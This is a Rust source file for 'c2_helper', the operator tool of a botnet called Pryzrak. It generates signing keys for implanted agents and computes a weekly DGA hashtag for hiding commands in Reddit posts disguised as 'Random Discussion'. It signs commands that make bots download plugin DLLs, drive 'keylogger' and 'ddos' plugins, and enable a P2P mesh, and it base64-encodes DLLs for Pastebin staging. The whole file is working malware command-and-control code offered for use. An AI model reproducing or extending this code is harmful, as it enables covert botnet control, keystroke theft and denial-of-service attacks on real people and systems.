use clap::{Parser, Subcommand};
use ed25519_dalek::{Signer, SigningKey};
use std::time::{SystemTime, UNIX_EPOCH};
use std::path::Path;
use base64::Engine; 

#[derive(Parser)]
#[command(name = "c2_helper")]
#[command(about = "Pryzrak C2 Support Tool: DGA, Signing, Plugin Commands", long_about = None)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// Generate a new Ed25519 Keypair
    Keygen {
        #[arg(short, long, default_value = "pryzrak")]
        out: String,
    },
    /// Calculate current DGA Hashtag
    Tag,
    /// Generate formatted Reddit post content (generic command)
    Post {
        /// The command to execute (e.g. "add_plugin URL" or "test:run")
        message: String,
        /// Path to Private Key (default: pryzrak.key)
        #[arg(short, long, default_value = "pryzrak.key")]
        key: String,
    },
    /// Generate a signed "add_plugin" command for Reddit
    AddPlugin {
        /// URL of the plugin DLL to download
        #[arg(short, long)]
        url: String,
        /// Path to Private Key (default: pryzrak.key)
        #[arg(short, long, default_value = "pryzrak.key")]
        key: String,
    },
    /// Generate a signed plugin dispatch command (name:command format)
    PluginCmd {
        /// Plugin name (e.g., "keylogger", "ddos")
        #[arg(short, long)]
        name: String,
        /// Command to send to the plugin
        #[arg(short, long)]
        cmd: String,
        /// Path to Private Key (default: pryzrak.key)
        #[arg(short, long, default_value = "pryzrak.key")]
        key: String,
    },
    /// Encode a DLL to Base64 for Pastebin upload
    EncodeDll {
        /// Path to the DLL file
        #[arg(short, long)]
        file: String,
        /// Optional output file (default: stdout)
        #[arg(short, long)]
        output: Option<String>,
    },
    /// Generate signed "enable_p2p" command (enables P2P mesh)
    EnableP2p {
        /// Path to Private Key (default: pryzrak.key)
        #[arg(short, long, default_value = "pryzrak.key")]
        key: String,
    },
    /// Generate signed "enable_all" command (enables P2P + Active mode)
    EnableAll {
        /// Path to Private Key (default: pryzrak.key)
        #[arg(short, long, default_value = "pryzrak.key")]
        key: String,
    },
}



// DGA Tag Generator (Xorshift)
fn generate_tag() -> String {
    let start = SystemTime::now();
    let seconds = start.duration_since(UNIX_EPOCH).unwrap().as_secs();
    let week_slot = seconds / 604800;
    
    let seed: u64 = 0x36A5EC9D09C60386;
    let mut state = week_slot ^ seed;
    state ^= state << 13;
    state ^= state >> 7;
    state ^= state << 17;
    
    format!("pryzrak-{:x}", state & 0xFFFF)
}

// Sign a message and format for Reddit
fn sign_and_format(message: &str, key_path: &str) -> Option<String> {
    let path = Path::new(key_path);
    if !path.exists() {
        eprintln!("(!) ERROR: Private key '{}' not found. Run 'keygen' first.", key_path);
        return None;
    }
    
    let key_bytes = std::fs::read(path).expect("Failed to read key");
    let signing_key = SigningKey::from_bytes(key_bytes[..32].try_into().unwrap());
    let sig = signing_key.sign(message.as_bytes());
    
    // Format: CMD:BASE64(MSG).HEX(SIG)
    let b64_msg = base64::engine::general_purpose::STANDARD.encode(message.as_bytes());
    let hex_sig = hex::encode(sig.to_bytes());
    
    Some(format!("CMD:{}.{}", b64_msg, hex_sig))
}

fn print_reddit_post(message: &str, key_path: &str) {
    let tag = generate_tag();
    println!("\n=== REDDIT POST CONTENT ===");
    println!("Title: Random Discussion #{}", tag);
    println!("---");
    
    if let Some(formatted) = sign_and_format(message, key_path) {
        println!("{}", formatted);
    }
    
    println!("---\n");
    println!("Hashtag to search: #{}", tag);
}

fn main() {
    let cli = Cli::parse();

    match cli.command {
        Commands::Keygen { out } => {
            let mut csprng = rand::rngs::OsRng;
            let signing_key = SigningKey::generate(&mut csprng);
            let verify_key = signing_key.verifying_key();
            
            let priv_path = format!("{}.key", out);
            let pub_path = format!("{}.pub", out);
            
            std::fs::write(&priv_path, signing_key.to_bytes()).unwrap();
            std::fs::write(&pub_path, verify_key.to_bytes()).unwrap();
            
            println!("Generated Keys:");
            println!("Private: {} (KEEP SAFE)", priv_path);
            println!("Public:  {} (EMBED IN AGENT)", pub_path);
            println!("Public Hex: {}", hex::encode(verify_key.to_bytes()));
        }
        Commands::Tag => {
            println!("Current Weekly Tag: #{}", generate_tag());
        }
        Commands::Post { message, key } => {
            print_reddit_post(&message, &key);
        }
        Commands::AddPlugin { url, key } => {
            // Format: add_plugin {url}
            let message = format!("add_plugin {}", url);
            println!("[*] Generating signed 'add_plugin' command...");
            println!("[*] Plugin URL: {}", url);
            print_reddit_post(&message, &key);
        }
        Commands::PluginCmd { name, cmd, key } => {
            // Format: {name}:{cmd}
            let message = format!("{}:{}", name, cmd);
            println!("[*] Generating signed plugin command...");
            println!("[*] Target: {} -> {}", name, cmd);
            print_reddit_post(&message, &key);
        }
        Commands::EncodeDll { file, output } => {
            let path = Path::new(&file);
            if !path.exists() {
                eprintln!("(!) ERROR: File '{}' not found.", file);
                return;
            }
            
            let bytes = std::fs::read(path).expect("Failed to read DLL");
            let b64 = base64::engine::general_purpose::STANDARD.encode(&bytes);
            
            println!("[*] Encoded {} bytes -> {} Base64 chars", bytes.len(), b64.len());
            
            if let Some(out_path) = output {
                std::fs::write(&out_path, &b64).expect("Failed to write output");
                println!("[+] Saved to: {}", out_path);
            } else {
                println!("\n=== BASE64 OUTPUT (Copy to Pastebin) ===\n");
                println!("{}", b64);
                println!("\n=== END ===");
            }
        }
        Commands::EnableP2p { key } => {
            println!("[*] Generating signed 'enable_p2p' command...");
            println!("[*] This will enable P2P mesh networking");
            print_reddit_post("enable_p2p", &key);
        }
        Commands::EnableAll { key } => {
            println!("[*] Generating signed 'enable_all' command...");
            println!("[*] This will enable P2P + Active mode");
            print_reddit_post("enable_all", &key);
        }
    }
}
